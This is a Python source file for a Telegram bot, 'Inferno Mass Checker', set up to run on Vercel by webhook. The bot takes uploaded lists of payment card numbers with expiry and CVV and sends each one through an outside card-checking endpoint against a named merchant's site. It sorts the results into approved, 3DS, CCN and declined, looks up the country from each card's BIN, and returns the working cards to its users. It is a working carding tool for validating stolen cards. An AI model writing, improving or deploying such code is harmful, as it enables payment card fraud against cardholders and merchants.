# --- WEBHOOK MODIFICATION ---
# Import necessary libraries for Vercel
import os
import json
from flask import Flask, request, Response

# --- WEBHOOK MODIFICATION ---
# Get secrets from Environment Variables (more secure)
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = int(os.environ.get("ADMIN_ID"))

# --- WEBHOOK MODIFICATION ---
# Initialize Flask app
app = Flask(__name__)

# Initialize the bot
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")

# ==========================
# AUTH SYSTEM (No changes needed here)
# ==========================
ALLOWED_FILE = "allowed_users.txt"
# Note: In a serverless environment, writing to a file is not persistent.
# For Vercel, user management should ideally use a database (like Vercel KV, Upstash, or a simple JSON file stored elsewhere).
# For now, this will work for a single session but will reset on each cold start.
# For a truly persistent solution, you'd need to refactor this part.
if not os.path.exists(ALLOWED_FILE):
    open(ALLOWED_FILE, "w").close()

def get_allowed_users():
    with open(ALLOWED_FILE) as f:
        return [line.strip() for line in f if line.strip()]

def add_user(uid):
    users = get_allowed_users()
    if str(uid) not in users:
        with open(ALLOWED_FILE, "a") as f:
            f.write(f"{uid}\n")
        return True
    return False

def remove_user(uid):
    users = get_allowed_users()
    if str(uid) in users:
        with open(ALLOWED_FILE, "w") as f:
            for u in users:
                if str(u) != str(uid):
                    f.write(u + "\n")
        return True
    return False

# ==========================
# BIN LOOKUP (No changes needed here)
# ==========================
def bin_lookup(bin_num):
    try:
        r = requests.get(f"https://bins.antipublic.cc/bins/{bin_num}", timeout=10)
        if r.status_code == 200:
            d = r.json()
            return d.get("country_name", "Unknown")
        return "Unknown"
    except:
        return "Unknown"

# ==========================
# STRIPE API (No changes needed here)
# ==========================
def check_card(site, card):
    try:
        url = f"https://infernoauthitter.vercel.app/process?key=inferno&site={site}&cc={card}"
        r = requests.get(url, timeout=20)
        return r.json()
    except:
        return {"Response": "Timeout ⚠️", "Status": "Failed"}

# ==========================
# ALL YOUR COMMAND HANDLERS (start, addusr, etc.)
# (They remain exactly the same, no changes needed)
# ==========================
@bot.message_handler(commands=['start', 'help'])
def start(msg):
    uid = str(msg.from_user.id)
    if uid not in get_allowed_users() and msg.from_user.id != ADMIN_ID:
        return bot.reply_to(msg, "```\n You are not authorized ❌\n```")
    
    text = (
        "```\n ✦ Inferno Mass Checker ✦\n```\n"
        "Upload a .txt file directly to start auto-check.\n"
        "/txt - Manual check mode\n"
        "▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
        "/addusr <id> - Add user (Admin only)\n"
        "/rmusr <id> - Remove user (Admin only)\n\n"
        "```\n Dev: @Taisirshaik1\n```"
    )
    bot.reply_to(msg, text)

@bot.message_handler(commands=['addusr'])
def add_user_command(msg):
    if msg.from_user.id != ADMIN_ID:
        return bot.reply_to(msg, "```\n Admin command only ❌\n```")
    
    try:
        uid = msg.text.split()[1]
        if add_user(uid):
            bot.reply_to(msg, f"```\n User {uid} added successfully ✅\n```")
        else:
            bot.reply_to(msg, f"```\n User {uid} already exists\n```")
    except IndexError:
        bot.reply_to(msg, "```\n Usage: /addusr <user_id>\n```")

@bot.message_handler(commands=['rmusr'])
def remove_user_command(msg):
    if msg.from_user.id != ADMIN_ID:
        return bot.reply_to(msg, "```\n Admin command only ❌\n```")
    
    try:
        uid = msg.text.split()[1]
        if remove_user(uid):
            bot.reply_to(msg, f"```\n User {uid} removed successfully ✅\n```")
        else:
            bot.reply_to(msg, f"```\n User {uid} not found\n```")
    except IndexError:
        bot.reply_to(msg, "```\n Usage: /rmusr <user_id>\n```")
        
@bot.message_handler(commands=['txt'])
def txt_manual(msg):
    uid = str(msg.from_user.id)
    if uid not in get_allowed_users() and msg.from_user.id != ADMIN_ID:
        return bot.reply_to(msg, "```\n You are not authorized ❌\n```")
    bot.reply_to(msg, "```\nSend your .txt file now.\n```")

@bot.message_handler(content_types=['document'])
def auto_process(file_msg):
    # ... (Your entire auto_process function remains the same) ...
    if not file_msg.document.file_name.endswith(".txt"):
        return bot.reply_to(file_msg, "```\nPlease upload .txt file only.\n```")

    uid = str(file_msg.from_user.id)
    if uid not in get_allowed_users() and file_msg.from_user.id != ADMIN_ID:
        return bot.reply_to(file_msg, "```\nYou are not authorized.\n```")

    file_info = bot.get_file(file_msg.document.file_id)
    downloaded = bot.download_file(file_info.file_path)
    cards = downloaded.decode('utf-8').splitlines()

    site = "https://madbarn.ca"
    total = len(cards)
    approved, declined, ccn, threed, processed = 0, 0, 0, 0, 0
    save_hits = []

    start_msg = (
        "```\n 🔥 Mass Checking Started\n```\n"
        f"Total Cards: {total}\n"
        f"Processed: 0/{total}\n"
        f"Approved: 0\n"
        f"3D: 0\n"
        f"Declined: 0\n"
        f"CCN: 0\n"
        "Status: Processing...\n"
    )
    log_message = bot.send_message(file_msg.chat.id, start_msg)

    for cc in cards:
        cc = cc.strip()
        if "|" not in cc:
            continue
        processed += 1
        res = check_card(site, cc)
        resp = res.get("Response", "").lower()

        if any(x in resp for x in ["declined", "zip", "expired"]):
            declined += 1
        elif any(x in resp for x in ["incorrect_cvc", "cvc", "security code"]):
            ccn += 1
        elif any(x in resp for x in ["3d", "3ds", "auth", "otp"]):
            threed += 1
            country = bin_lookup(cc[:6])
            approved_msg = (f"```\n 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗙𝗼𝘂𝗻𝗱 ✅\n```\n*[⌯]Card*: {cc}\n*[⌯]Response*: 3Ds Required\n*[⌯]Info*: {country}\n")
            bot.send_message(file_msg.from_user.id, approved_msg)
            save_hits.append(f"{cc}  [××]  3Ds Required")
        elif any(x in resp for x in ["approved", "added", "success", "card added"]):
            approved += 1
            country = bin_lookup(cc[:6])
            approved_msg = (f"```\n 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗙𝗼𝘂𝗻𝗱 ✅\n```\n*[⌯] Card*: {cc}\n*[⌯] Response*: Card Added\n*[⌯] Info*: {country}\n")
            bot.send_message(file_msg.from_user.id, approved_msg)
            save_hits.append(f"{cc}  [××]  Approved")
        else:
            declined += 1
        
        try:
            updated_log = (f"```\n 🔥 Mass Checking Started\n```\nTotal Cards: {total}\nProcessed: {processed}/{total}\nApproved: {approved}\n3D: {threed}\nDeclined: {declined}\nCCN: {ccn}\nStatus: Processing...\n")
            bot.edit_message_text(chat_id=file_msg.chat.id, message_id=log_message.message_id, text=updated_log)
        except Exception as e:
            print(f"Error updating log: {e}")

    # Final summary and file sending logic remains the same...
    final_log = (f"```\n ⚡ 𝑳𝒊𝒗𝒆 𝑳𝒐𝒈𝒔 𝑼𝒑𝒅𝒂𝒕𝒆 \n```\nTotal: {total}\nProcessed: {processed}\nApproved: {approved}\n3D: {threed}\nDeclined: {declined}\nCCN: {ccn}\nStatus: Completed ✓\n")
    try:
        bot.edit_message_text(chat_id=file_msg.chat.id, message_id=log_message.message_id, text=final_log)
    except Exception as e:
        print(f"Error updating final log: {e}")
        
    final_text = (f"```\n ✓ 𝑴𝒂𝒔𝒔 𝑪𝒉𝒆𝒄𝒌 𝑪𝒐𝒎𝒑𝒍𝒆𝒕𝒆𝒅 \n```\n*[⌯] Total*: {total}\n*[⌯] Processed*: {processed}\n*[⌯] Approved*: {approved}\n*[⌯] 3D*: {threed}\n*[⌯] Declined*: {declined}\n*[⌯] CCN*: {ccn}\n")
    bot.send_message(file_msg.chat.id, final_text)

    if save_hits:
        filename = f"approved_{file_msg.from_user.id}.txt"
        with open(filename, "w") as f:
            for line in save_hits:
                f.write(line + "\n")
        with open(filename, "rb") as f:
            bot.send_document(file_msg.from_user.id, f, caption="🔥 Approved & 3D Results")
        os.remove(filename)


# ==========================
# WEBHOOK ENDPOINT
# ==========================
# --- WEBHOOK MODIFICATION ---
# This is the main entry point for Vercel. It receives updates from Telegram.
@app.route('/', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return Response('ok', status=200)
    else:
        return Response('Invalid request', status=400)

# --- WEBHOOK MODIFICATION ---
# A simple route to check if the app is running
@app.route('/')
def index():
    return "Bot is running!"
